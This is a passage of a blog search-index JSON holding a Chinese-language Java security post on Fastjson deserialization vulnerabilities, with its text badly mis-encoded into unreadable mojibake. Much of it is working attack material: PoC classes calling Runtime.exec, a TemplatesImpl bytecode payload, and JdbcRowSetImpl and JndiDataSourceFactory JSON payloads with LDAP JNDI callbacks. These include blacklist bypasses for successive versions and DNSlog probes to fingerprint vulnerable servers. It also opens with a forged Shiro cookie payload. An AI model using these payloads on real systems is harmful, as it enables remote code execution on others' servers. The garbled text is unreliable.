print(AES_enc(data))ç»“æœï¼šLPWtx1kiT9aPgmH56vw8ertCoG8oAFBmIu3ZtNyaoQtCK9vOekQ4Tx4dKtoxKOsRizCxYoIlWHkHJqvzIZQ5YpgqYEoUVEVqExcCH5xVfbgQD12/ge8euUyZiwIXNouGyO4GbSYEdenS437PYmBvIhQqh3nUrY1KKoVRPOb+F0FxWe9cYXHO/QXvPoLAwIyO/YQte8bW02bYOA26SSKbMLQ4glOTf52JbwLkVB6Shfc4ylY8kDEx34F/E2pwDMk1JNbQfDoUVUAYTN4JEcr4MidEZm5m/1pPnXvvF00A+m+h5ajsDrRRBnOGiqZb6FdHmyh1tA/KUcFMtS29hiEMwDqne0J/9keqnz+9216OF35lWkGcwrOxo7Kab1XCJwM2OR8clh8EtGjO4SQPixNemLcaAPMD23yj5u7d/6EpqmyQ01/93kzt6ATeIjahg9ftNrly9P5oFpF383710PONt5bA80uFU9NY9PRAGstfoITH1hvXynn76HdD3qCZxrqGyP11eQlU1sKByp1ncS9Pqg== æŠ“åŒ…è¯¥cookieï¼Œåˆ©ç”¨æˆåŠŸ","categories":[{"name":"javaå®‰å…¨","slug":"javaå®‰å…¨","permalink":"http://example.com/categories/java%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"javaå®‰å…¨","slug":"javaå®‰å…¨","permalink":"http://example.com/tags/java%E5%AE%89%E5%85%A8/"},{"name":"javaæ¡†æ¶","slug":"javaæ¡†æ¶","permalink":"http://example.com/tags/java%E6%A1%86%E6%9E%B6/"}]},{"title":"Fastjson ååºåˆ—åŒ–æ¼æ´","slug":"fastjsonæ¼æ´åŸç†","date":"2022-07-31T13:16:50.000Z","updated":"2022-09-01T00:38:50.463Z","comments":true,"path":"2022/07/31/fastjsonæ¼æ´åŸç†/","link":"","permalink":"http://example.com/2022/07/31/fastjson%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/","excerpt":"","text":"fastjson ååºåˆ—åŒ–æ¼æ´fastjsonä»‹ç» åœ¨å‰åç«¯æ•°æ®ä¼ è¾“äº¤äº’ä¸­,ç»å¸¸ä¼šé‡åˆ°å­—ç¬¦ä¸²(String)ä¸json,XMLç­‰æ ¼å¼ç›¸äº’è½¬æ¢ä¸è§£æï¼Œå…¶ä¸­jsonä»¥è·¨è¯­è¨€ï¼Œè·¨å‰åç«¯çš„ä¼˜ç‚¹åœ¨å¼€å‘ä¸­è¢«é¢‘ç¹ä½¿ç”¨ï¼ŒåŸºæœ¬ä¸Šå¯ä»¥è¯´æ˜¯æ ‡å‡†çš„æ•°æ®äº¤æ¢æ ¼å¼ã€‚fastjson æ˜¯ä¸€ä¸ªjavaè¯­è¨€ç¼–å†™çš„é«˜æ€§èƒ½ä¸”åŠŸèƒ½å®Œå–„çš„JSONåº“ï¼Œå®ƒé‡‡ç”¨ä¸€ç§â€œå‡å®šæœ‰åºå¿«é€ŸåŒ¹é…â€çš„ç®—æ³•ï¼ŒæŠŠJSON Parse çš„æ€§èƒ½æå‡åˆ°äº†æè‡´ã€‚å®ƒçš„æ¥å£ç®€å•æ˜“ç”¨ï¼Œå·²ç»è¢«å¹¿æ³›ä½¿ç”¨åœ¨ç¼“å­˜åºåˆ—åŒ–ï¼Œåè®®äº¤äº’ï¼ŒWebè¾“å‡ºç­‰å„ç§åº”ç”¨åœºæ™¯ä¸­ã€‚ FastJsonæ˜¯å•Šé‡Œå·´å·´çš„çš„å¼€æºåº“ï¼Œç”¨äºå¯¹JSONæ ¼å¼çš„æ•°æ®è¿›è¡Œè§£æå’Œæ‰“åŒ…ã€‚ æ¼æ´ä»‹ç»fastjsonåœ¨åºåˆ—åŒ–ä»¥åŠååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­å¹¶æ²¡æœ‰ä½¿ç”¨Javaè‡ªå¸¦çš„åºåˆ—åŒ–æœºåˆ¶ï¼Œè€Œæ˜¯è‡ªå®šä¹‰äº†ä¸€å¥—æœºåˆ¶ã€‚å…¶å®ï¼Œå¯¹äºJSONæ¡†æ¶æ¥è¯´ï¼Œæƒ³è¦æŠŠä¸€ä¸ªJavaå¯¹è±¡è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå¯ä»¥æœ‰ä¸¤ç§é€‰æ‹©ï¼šåŸºäºå±æ€§åŸºäºsetter&#x2F;getter 12345678910class Apple implements Fruit &#123; private Big_Decimal price; //çœç•¥ setter/getterã€toStringç­‰&#125;class iphone implements Fruit &#123; private Big_Decimal price; //çœç•¥ setter/getterã€toStringç­‰&#125; 123toJSONString : &#123;&quot;fruit&quot;:&#123;&quot;price&quot;:0.5&#125;&#125;toJSONString : &#123;&quot;fruit&quot;:&#123;&quot;price&quot;:500&#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354public class Fastjson &#123; public String name; public String age; public Fastjson() throws IOException &#123; this.name=&quot;james&quot;; this.age=&quot;18&quot;; &#125; public void setName(String test) &#123; System.out.println(&quot;name setter called&quot;); this.name = test; &#125; public String getName() &#123; System.out.println(&quot;name getter called&quot;); return this.name; &#125; public void setAge(String test) &#123; System.out.println(&quot;age setter called&quot;); this.age = test; &#125; public String getAge()&#123; System.out.println(&quot;age getter called&quot;); return this.age; &#125; @Override public String toString() &#123; return &quot;Fastjson&#123;&quot; + &quot;name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; + &quot;, age=&#x27;&quot; + age + &#x27;\\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125; public static void main(String[] args) throws IOException &#123; //ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String o = JSON.toJSONString(new Fastjson()); System.out.println(o); //classè½¬ä¸ºjson System.out.println(&quot;------------&quot;); Fastjson obj = (Fastjson) JSON.parse(&quot;&#123;\\&quot;@type\\&quot;:\\&quot;com.fastjson.test.Fastjson\\&quot;,\\&quot;name\\&quot;:\\&quot;test name\\&quot;, \\&quot;age\\&quot;:\\&quot;test age\\&quot;&#125;&quot;); System.out.println(obj); //æ™®é€šjsonå¯¹è±¡è½¬ä¸ºobjectç±» &#125;&#125;output://age getter calledname getter called&#123;&quot;age&quot;:&quot;18&quot;,&quot;name&quot;:&quot;james&quot;&#125;------------name setter calledage setter calledFastjson&#123;name=&#x27;test name&#x27;, age=&#x27;test age&#x27;&#125; 12345678ä¸ºäº†è§£å†³ä¸Šè¿°é—®é¢˜ï¼šfastjsonå¼•å…¥äº†AutoTypeï¼Œå³åœ¨åºåˆ—åŒ–çš„æ—¶å€™ï¼ŒæŠŠåŸå§‹ç±»å‹è®°å½•ä¸‹æ¥ã€‚&#123; &quot;fruit&quot;:&#123; &quot;@type&quot;:&quot;com.hollis.lab.fastjson.test.Apple&quot;, &quot;price&quot;:0.5 &#125;&#125; fastjson åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šå»æ‰¾æˆ‘ä»¬åœ¨ @type ä¸­è§„å®šçš„ç±»æ˜¯å“ªä¸ªç±»ï¼Œç„¶ååœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨è¿™äº› setter ä¸ getter æ–¹æ³•çš„è°ƒç”¨ï¼Œæ³¨æ„ï¼å¹¶ä¸æ˜¯æ‰€æœ‰çš„ setter å’Œ getter æ–¹æ³•ã€‚ ä¸‹é¢ç›´æ¥å¼•ç”¨ç»“è®ºï¼ŒFastjsonä¼šå¯¹æ»¡è¶³ä¸‹åˆ—è¦æ±‚çš„setter&#x2F;getteræ–¹æ³•è¿›è¡Œè°ƒç”¨ï¼š 1234567891011æ»¡è¶³æ¡ä»¶çš„setterï¼š- éé™æ€å‡½æ•°- è¿”å›ç±»å‹ä¸ºvoidæˆ–å½“å‰ç±»- å‚æ•°ä¸ªæ•°ä¸º1ä¸ªæ»¡è¶³æ¡ä»¶çš„getterï¼š- éé™æ€æ–¹æ³•- æ— å‚æ•°- **è¿”å›å€¼ç±»å‹ç»§æ‰¿è‡ªCollectionæˆ–Mapæˆ–AtomicBooleanæˆ–AtomicIntegeræˆ–AtomicLong** æˆ‘ä¸ªäººç†è§£ fastjson çš„åˆ©ç”¨æ”»å‡»å…¶å®æ˜¯è›®ç®€å•çš„ï¼Œå› ä¸ºæ²¡æœ‰é‚£ä¹ˆå¤šå¤æ‚çš„é“¾å­ï¼Œä¹Ÿä¸éœ€è¦åå°„ä¿®æ”¹å€¼ï¼Œç›´æ¥åœ¨ json ä¸²é‡Œé¢èµ‹å€¼å°±å¥½äº†ã€‚ æ¼æ´åŸç†ç”±å‰é¢çŸ¥é“ï¼ŒFastjsonæ˜¯è‡ªå·±å®ç°çš„ä¸€å¥—åºåˆ—åŒ–å’Œååºåˆ—åŒ–æœºåˆ¶ï¼Œä¸æ˜¯ç”¨çš„JavaåŸç”Ÿçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æœºåˆ¶ã€‚æ— è®ºæ˜¯å“ªä¸ªç‰ˆæœ¬ï¼ŒFastjsonååºåˆ—åŒ–æ¼æ´çš„åŸç†éƒ½æ˜¯ä¸€æ ·çš„ï¼Œåªä¸è¿‡ä¸åŒç‰ˆæœ¬æ˜¯é’ˆå¯¹ä¸åŒçš„é»‘åå•æˆ–è€…åˆ©ç”¨ä¸åŒåˆ©ç”¨é“¾æ¥è¿›è¡Œç»•è¿‡åˆ©ç”¨è€Œå·²ã€‚ é€šè¿‡Fastjsonååºåˆ—åŒ–æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥ä¼ å…¥ä¸€ä¸ªæ¶æ„æ„é€ çš„JSONå†…å®¹ï¼Œç¨‹åºå¯¹å…¶è¿›è¡Œååºåˆ—åŒ–åå¾—åˆ°æ¶æ„ç±»å¹¶æ‰§è¡Œäº†æ¶æ„ç±»ä¸­çš„æ¶æ„å‡½æ•°ï¼Œè¿›è€Œå¯¼è‡´ä»£ç æ‰§è¡Œã€‚ é‚£ä¹ˆå¦‚ä½•æ‰èƒ½å¤Ÿååºåˆ—åŒ–å‡ºæ¶æ„ç±»å‘¢ï¼Ÿ ç”±å‰é¢demoçŸ¥é“ï¼ŒFastjsonä½¿ç”¨parseObject()&#x2F;parse()è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™å¯ä»¥æŒ‡å®šç±»å‹ã€‚å¦‚æœæŒ‡å®šçš„ç±»å‹å¤ªå¤§ï¼ŒåŒ…å«å¤ªå¤šå­ç±»ï¼Œå°±æœ‰åˆ©ç”¨ç©ºé—´äº†ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæŒ‡å®šç±»å‹ä¸ºObjectæˆ–JSONObjectï¼Œåˆ™å¯ä»¥ååºåˆ—åŒ–å‡ºæ¥ä»»æ„ç±»ã€‚ä¾‹å¦‚ä»£ç å†™Object o = JSON.parseObject(poc,Object.class)å°±å¯ä»¥ååºåˆ—åŒ–å‡ºObjectç±»æˆ–å…¶ä»»æ„å­ç±»ï¼Œè€ŒObjectåˆæ˜¯ä»»æ„ç±»çš„çˆ¶ç±»ï¼Œæ‰€ä»¥å°±å¯ä»¥ååºåˆ—åŒ–å‡ºæ‰€æœ‰ç±»ã€‚ å¦‚ä½•æ‰èƒ½è§¦å‘ååºåˆ—åŒ–å¾—åˆ°çš„æ¶æ„ç±»ä¸­çš„æ¶æ„å‡½æ•°å‘¢? ç”±å‰é¢çŸ¥é“ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹è¿›è¡Œååºåˆ—åŒ–æ—¶ä¼šå°†ååºåˆ—åŒ–å¾—åˆ°çš„ç±»çš„æ„é€ å‡½æ•°ã€getteræ–¹æ³•ã€setteræ–¹æ³•æ‰§è¡Œä¸€éï¼Œå¦‚æœè¿™ä¸‰ç§æ–¹æ³•ä¸­å­˜åœ¨å±é™©æ“ä½œï¼Œåˆ™å¯èƒ½å¯¼è‡´ååºåˆ—åŒ–æ¼æ´çš„å­˜åœ¨ã€‚æ¢å¥è¯è¯´ï¼Œå°±æ˜¯æ”»å‡»è€…ä¼ å…¥è¦è¿›è¡Œååºåˆ—åŒ–çš„ç±»ä¸­çš„æ„é€ å‡½æ•°ã€getteræ–¹æ³•ã€setteræ–¹æ³•ä¸­è¦å­˜åœ¨æ¼æ´æ‰èƒ½è§¦å‘ã€‚ æˆ‘ä»¬åˆ°DefaultJSONParser.parseObject(Map object, Object fieldName)ä¸­çœ‹ä¸‹ï¼ŒJSONä¸­ä»¥@typeå½¢å¼ä¼ å…¥çš„ç±»çš„æ—¶å€™ï¼Œè°ƒç”¨deserializer.deserialize()å¤„ç†è¯¥ç±»ï¼Œå¹¶å»è°ƒç”¨è¿™ä¸ªç±»çš„setterå’Œgetteræ–¹æ³•ï¼š 1234567public final Object parseObject(final Map object, Object fieldName) &#123; ... // JSON.DEFAULT_TYPE_KEYå³@type if (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123; ... ObjectDeserializer deserializer = config.getDeserializer(clazz); return deserializer.deserialze(this, clazz, fieldName); æ•´ä¸ªè§£æè¿‡ç¨‹ç›¸å½“å¤æ‚ï¼ŒçŸ¥é“ç»“è®ºå°±okäº†ã€‚ å°ç»“ä¸€ä¸‹è‹¥ååºåˆ—åŒ–æŒ‡å®šç±»å‹çš„ç±»å¦‚Student obj = JSON.parseObject(text, Student.class);ï¼Œè¯¥ç±»æœ¬èº«çš„æ„é€ å‡½æ•°ã€setteræ–¹æ³•ã€getteræ–¹æ³•å­˜åœ¨å±é™©æ“ä½œï¼Œåˆ™å­˜åœ¨Fastjsonååºåˆ—åŒ–æ¼æ´ï¼› 123456public void setName(String test) throws IOException &#123; System.out.println(&quot;name setter called&quot;); Runtime.getRuntime().exec(&quot;calc&quot;); this.name = test; &#125;//å¼¹å‡ºcalc è‹¥ååºåˆ—åŒ–æœªæŒ‡å®šç±»å‹çš„ç±»å¦‚Object obj = JSON.parseObject(text, Object.class);ï¼Œè¯¥è‹¥è¯¥ç±»çš„å­ç±»çš„æ„é€ æ–¹æ³•ã€setteræ–¹æ³•ã€getteræ–¹æ³•å­˜åœ¨å±é™©æ“ä½œï¼Œåˆ™å­˜åœ¨Fastjsonååºåˆ—åŒ–æ¼æ´ï¼› PoC å†™æ³•ä¸€èˆ¬çš„ï¼ŒFastjsonååºåˆ—åŒ–æ¼æ´çš„PoCå†™æ³•å¦‚ä¸‹ï¼Œ@typeæŒ‡å®šäº†ååºåˆ—åŒ–å¾—åˆ°çš„ç±» 12345&#123;&quot;@type&quot;:&quot;xxx.xxx.xxx&quot;,&quot;xxx&quot;:&quot;xxx&quot;,...&#125; å…³é”®æ˜¯è¦æ‰¾å‡ºä¸€ä¸ªç‰¹æ®Šçš„åœ¨ç›®æ ‡ç¯å¢ƒä¸­å·²å­˜åœ¨çš„ç±»ï¼Œæ»¡è¶³å¦‚ä¸‹ä¸¤ä¸ªæ¡ä»¶ï¼š è¯¥ç±»çš„æ„é€ å‡½æ•°ã€setteræ–¹æ³•ã€getteræ–¹æ³•ä¸­çš„æŸä¸€ä¸ªå­˜åœ¨å±é™©æ“ä½œï¼Œæ¯”å¦‚é€ æˆå‘½ä»¤æ‰§è¡Œï¼› å¯ä»¥æ§åˆ¶è¯¥æ¼æ´å‡½æ•°çš„å˜é‡ï¼ˆä¸€èˆ¬å°±æ˜¯è¯¥ç±»çš„å±æ€§ï¼‰ï¼› æ¼æ´Demoç”±å‰é¢æ¯”è¾ƒçš„æ¡ˆä¾‹çŸ¥é“ï¼Œå½“ååºåˆ—åŒ–æŒ‡å®šçš„ç±»å‹æ˜¯Object.classï¼Œå³ä»£ç ä¸ºObject obj = JSON.parseObject(jsonstring, Object.class, Feature.SupportNonPublicField);æ—¶ï¼Œååºåˆ—åŒ–å¾—åˆ°çš„ç±»çš„æ„é€ å‡½æ•°ã€æ‰€æœ‰å±æ€§çš„setteræ–¹æ³•ã€propertiesç§æœ‰å±æ€§çš„getteræ–¹æ³•éƒ½ä¼šè¢«è°ƒç”¨ï¼Œå› æ­¤æˆ‘ä»¬è¿™é‡Œç›´æ¥åšæœ€ç®€å•çš„ä¿®æ”¹ï¼Œå°†Studentç±»ä¸­ä¼šè¢«è°ƒç”¨çš„getteræ–¹æ³•æ·»åŠ æ¼æ´ä»£ç ï¼Œè¿™é‡Œä¿®æ”¹getProperties()ä½œä¸ºæ¼”ç¤ºï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243import java.util.Properties; public class Student &#123; private String name; private int age; private String address; private Properties properties; public Student() &#123; System.out.println(&quot;æ„é€ å‡½æ•°&quot;); &#125; public String getName() &#123; System.out.println(&quot;getName&quot;); return name; &#125; public void setName(String name) &#123; System.out.println(&quot;setName&quot;); this.name = name; &#125; public int getAge() &#123; System.out.println(&quot;getAge&quot;); return age; &#125; // public void setAge(int age) &#123; // System.out.println(&quot;setAge&quot;); // this.age = age; // &#125; public String getAddress() &#123; System.out.println(&quot;getAddress&quot;); return address; &#125; public Properties getProperties() throws Exception&#123; System.out.println(&quot;getProperties&quot;); Runtime.getRuntime().exec(&quot;calc&quot;); return properties; &#125; &#125; FastjsonEasyPoC.java 12345678910111213import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.Feature; public class FastjsonEasyPoC &#123; public static void main(String[] args)&#123; String jsonString =&quot;&#123;\\&quot;@type\\&quot;:\\&quot;Student\\&quot;,\\&quot;age\\&quot;:6,\\&quot;name\\&quot;:\\&quot;Drunkbaby\\&quot;,\\&quot;address\\&quot;:\\&quot;china\\&quot;,\\&quot;properties\\&quot;:&#123;&#125;&#125;&quot;; Object obj = JSON.parseObject(jsonString, Object.class); System.out.println(obj); System.out.println(obj.getClass().getName()); &#125; &#125; å¾ˆæ˜æ˜¾ï¼Œå‰é¢çš„Demoä¸­ååºåˆ—åŒ–çš„ç±»æ˜¯ä¸€ä¸ªObjectç±»ï¼Œè¯¥ç±»æ˜¯ä»»æ„ç±»çš„çˆ¶ç±»ï¼Œå…¶å­ç±»Studentå­˜åœ¨Fastjsonååºåˆ—åŒ–æ¼æ´ï¼Œå½“@typeæŒ‡å‘Studentç±»æ˜¯ååºåˆ—åŒ–å°±ä¼šè§¦å‘æ¼æ´ã€‚ å¯¹äºå¦ä¸€ç§ååºåˆ—åŒ–æŒ‡å®šç±»çš„æƒ…æ™¯ï¼Œæ˜¯è¯¥æŒ‡å®šç±»æœ¬èº«å°±å­˜åœ¨æ¼æ´ï¼Œæ¯”å¦‚æˆ‘ä»¬å°†ä¸Šè¿°Demoä¸­ååºåˆ—åŒ–é‚£è¡Œä»£ç æ”¹æˆç›´æ¥ååºåˆ—åŒ–å¾—åˆ°Studentç±»è€ŒéObjectç±»ï¼Œè¿™æ ·å°±æ˜¯å¦ä¸€ä¸ªè§¦å‘ä¹Ÿæ˜¯æœ€ç›´æ¥çš„è§¦å‘åœºæ™¯ï¼š æ¼æ´æ”»é˜²å² v1.2.24ä¹‹å‰ @typeè‡ªåŠ¨åŠ è½½ç±» v1.2.41ä¹‹å‰ï¼Œ fastjsoné»˜è®¤å…³é—­äº†autotypeæ”¯æŒï¼Œå¹¶ä¸”åŠ å…¥äº†checkAutotype ï¼ˆè¿‡æ»¤@typeé‡Œçš„å€¼ï¼Œé»‘ç™½å å•è¿‡æ»¤ï¼‰ åŠ è½½çš„è¿‡ç¨‹ä¸­ï¼Œfastjsonæœ‰ä¸€æ®µç‰¹æ®Šçš„å¤„ç†ï¼Œé‚£å°±æ˜¯åœ¨å…·ä½“åŠ è½½ç±»çš„æ—¶å€™ä¼šå»æ‰classNameå‰åçš„Lå’Œåé¢çš„åˆ†å·;ï¼Œå½¢å¦‚Lcom.lang.Thread; Lcom.sun.rowset.JdbcRowSetImpl; v1.2.42 åœ¨è¿›è¡Œé»‘ç™½åå•æ£€æµ‹çš„æ—¶å€™ï¼Œfastjsonå…ˆåˆ¤æ–­ç›®æ ‡ç±»çš„ç±»åçš„å‰åæ˜¯ä¸æ˜¯Lå’Œ;ï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œå°±æˆªå–æ‰å‰åçš„Lå’Œ;å†è¿›è¡Œé»‘ç™½åå•çš„æ ¡éªŒ LLcom.sun.rowset.JdbcRowSetImpl;; v1.2.43 fastjsonè¿™æ¬¡åœ¨é»‘ç™½åå•åˆ¤æ–­ä¹‹å‰ï¼Œå¢åŠ äº†ä¸€ä¸ªæ˜¯å¦ä»¥LLæœªå¼€å¤´çš„åˆ¤æ–­ åœ¨ç›®æ ‡ç±»å‰é¢æ·»åŠ [ v1.2.44ç‰ˆæœ¬ä¸­ï¼Œfastjsonçš„ä½œè€…åšäº†æ›´åŠ ä¸¥æ ¼çš„è¦æ±‚ï¼Œåªè¦ç›®æ ‡ç±»ä»¥[å¼€å¤´æˆ–è€…ä»¥;ç»“å°¾ v1.2.47 autoTypeä¸å¼€å¯åè€Œä¼šè¢«æ”»å‡»ã€‚å› ä¸ºåœ¨fastjsonä¸­æœ‰ä¸€ä¸ªå…¨å±€ç¼“å­˜ï¼Œåœ¨ç±»åŠ è½½çš„æ—¶å€™ï¼Œå¦‚æœautotypeæ²¡å¼€å¯ï¼Œä¼šå…ˆå°è¯•ä»ç¼“å­˜ä¸­è·å–ç±»ï¼Œå¦‚æœç¼“å­˜ä¸­æœ‰ï¼Œåˆ™ç›´æ¥è¿”å›ã€‚java.lang.Classç±»å¯¹åº”çš„deserializerä¸ºMiscCodecï¼Œååºåˆ—åŒ–æ—¶ä¼šå–jsonä¸²ä¸­çš„valå€¼å¹¶åŠ è½½è¿™ä¸ªvalå¯¹åº”çš„ç±»ã€‚å¦‚æœfastjson cacheä¸ºtrueï¼Œå°±ä¼šç¼“å­˜è¿™ä¸ªvalå¯¹åº”çš„classåˆ°å…¨å±€ç¼“å­˜ä¸­ v1.2.68 åˆ©ç”¨å¼‚å¸¸è¿›è¡Œæ”»å‡» OOMåœ¨fastjsonä¸­ï¼Œ å¦‚æœ@type æŒ‡å®šçš„ç±»ä¸º Throwable çš„å­ç±»ï¼Œé‚£å¯¹åº”çš„ååºåˆ—åŒ–å¤„ç†ç±»å°±ä¼šä½¿ç”¨åˆ° ThrowableDeserializerè€Œåœ¨ThrowableDeserializer#deserialzeçš„æ–¹æ³•ä¸­ï¼Œå½“æœ‰ä¸€ä¸ªå­—æ®µçš„keyä¹Ÿæ˜¯ @typeæ—¶ï¼Œå°±ä¼šæŠŠè¿™ä¸ª value å½“åšç±»åï¼Œç„¶åè¿›è¡Œä¸€æ¬¡ checkAutoType æ£€æµ‹ã€‚å¹¶ä¸”æŒ‡å®šäº†expectClassä¸ºThrowable.classï¼Œä½†æ˜¯åœ¨checkAutoTypeä¸­ï¼Œæœ‰è¿™æ ·ä¸€çº¦å®šï¼Œé‚£å°±æ˜¯å¦‚æœæŒ‡å®šäº†expectClass ï¼Œé‚£ä¹ˆä¹Ÿä¼šé€šè¿‡æ ¡éªŒã€‚å› ä¸ºfastjsonåœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šå°è¯•æ‰§è¡Œé‡Œé¢çš„getteræ–¹æ³•ï¼Œè€ŒExceptionç±»ä¸­éƒ½æœ‰ä¸€ä¸ªgetMessageæ–¹æ³•ã€‚åªéœ€è¦è‡ªå®šä¹‰ä¸€ä¸ªå¼‚å¸¸ï¼Œå¹¶ä¸”é‡å†™å…¶getMessageå°±è¾¾åˆ°äº†æ”»å‡»çš„ç›®çš„ã€‚ æ¼æ´åˆ†æfastjson1.2.24TemplatesImpl æ¼æ´åˆ©ç”¨é“¾ 1234561.æ„é€ ä¸€ä¸ª TemplatesImpl ç±»çš„ååºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œå…¶ä¸­ _bytecodes æ˜¯æˆ‘ä»¬æ„é€ çš„æ¶æ„ç±»çš„ç±»å­—èŠ‚ç ï¼Œè¿™ä¸ªç±»çš„çˆ¶ç±»æ˜¯ AbstractTransletï¼Œæœ€ç»ˆè¿™ä¸ªç±»ä¼šè¢«åŠ è½½å¹¶ä½¿ç”¨ newInstance() å®ä¾‹åŒ–ã€‚2.åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œç”±äºgetteræ–¹æ³• getOutputProperties()ï¼Œæ»¡è¶³æ¡ä»¶ï¼Œå°†ä¼šè¢« fastjson è°ƒç”¨ï¼Œè€Œè¿™ä¸ªæ–¹æ³•è§¦å‘äº†æ•´ä¸ªæ¼æ´åˆ©ç”¨æµç¨‹ï¼šgetOutputProperties() -&gt; newTransformer()-&gt; getTransletInstance() -&gt; defineTransletClasses() / EvilClass.newInstance(). payload 1234567&#123; &quot;@type&quot;: &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;, &quot;_bytecodes&quot;: [&quot;yv66vgAAADQA...CJAAk=&quot;], &quot;_name&quot;: &quot;su18&quot;, &quot;_tfactory&quot;: &#123;&#125;, &quot;_outputProperties&quot;: &#123;&#125;,&#125; ä»£ç  12345678910111213141516public class Fastjson24poc &#123; public static void main(String[] args) &#123; //TemplatesImpl String byteCode = &quot;xxxxxxxxxxxxxxx&quot;; //æ„é€ TemplatesImplçš„jsonæ•°æ®ï¼Œå¹¶å°†æ¶æ„ç±»æ³¨å…¥åˆ°jsonæ•°æ®ä¸­ final String NASTY_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;; String payload = &quot;&#123;\\&quot;@type\\&quot;:\\&quot;&quot; + NASTY_CLASS + &quot;\\&quot;,\\&quot;_bytecodes\\&quot;:[\\&quot;&quot;+byteCode+&quot;\\&quot;],&quot; + &quot;&#x27;_name&#x27;:&#x27;TempletaPoc&#x27;,&quot; + &quot;&#x27;_tfactory&#x27;:&#123;&#125;,&quot; + &quot;\\&quot;_outputProperties\\&quot;:&#123;&#125;&#125;\\n&quot;; System.out.println(payload); //ååºåˆ—åŒ– Object object = JSON.parseObject(payload, Feature.SupportNonPublicField); &#125;&#125; JdbcRowSetImpl payload 12345&#123; &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;autoCommit&quot;:true&#125; fastjson1.2.25 payload 12345&#123; &quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;, &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;autoCommit&quot;:true&#125; fastjson1.2.42 payload 12345&#123; &quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;, &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;autoCommit&quot;:true&#125; fastjson1.2.43 payload 12345&#123; &quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[, &#123;&quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;autoCommit&quot;:true&#125; fastjson1.2.44 è¿™ä¸ªç‰ˆæœ¬ä¸»è¦æ˜¯ä¿®å¤ä¸Šä¸€ä¸ªç‰ˆæœ¬ä¸­ä½¿ç”¨ [ ç»•è¿‡é»‘åå•é˜²æŠ¤çš„é—®é¢˜ fastjson1.2.45 é»‘åå•ç»•è¿‡ payload 123456&#123; &quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;, &quot;properties&quot;:&#123; &quot;data_source&quot;:&quot;ldap://127.0.0.1:23457/Command8&quot; &#125;&#125; fastjson1.2.47 payload 1234567891011&#123; &quot;su18&quot;: &#123; &quot;@type&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot; &#125;, &quot;su19&quot;: &#123; &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;autoCommit&quot;: true &#125;&#125; fastjsonç‰ˆæœ¬æ¢æµ‹DNSlogæ¢æµ‹ ä»¥ä¸‹POCå‡ºç½‘ï¼Œè¯´æ˜fastjson&lt;&#x3D;1.2.47 1&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;1247.xxxxx.dnslog.cn&quot;&#125;&#125; ä»¥ä¸‹è¿™ä¸ªPOCå‡ºç½‘ï¼Œè¯´æ˜fastjson&gt;&#x3D;1.2.37 1&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://weffewfddd.dnslog.cn&quot;&#125;:&quot;aaa&quot;&#125; ä»¥ä¸‹è¿™ä¸ªPOCå‡ºç½‘ï¼Œè¯æ˜fastjsonç‰ˆæœ¬å·1.1.16&lt;&#x3D;version&lt;&#x3D;1.2.24 1&#123;&quot;b&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://xxxdsf.dnslog.cn:9999/POC&quot;,&quot;autoCommit&quot;:true&#125;&#125; ä»¥ä¸‹è¿™å‡ ä¸ªPOCï¼Œåªèƒ½è¯æ˜fastjsonå‡ºç½‘ï¼Œæ— æ³•åˆ¤æ–­fastjsonæ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œå› ä¸ºæœ€æ–°çš„æ‰“äº†è¡¥ä¸çš„fastjsonä¹Ÿæ˜¯èƒ½å‘èµ·DNSè¯·æ±‚çš„ã€‚ 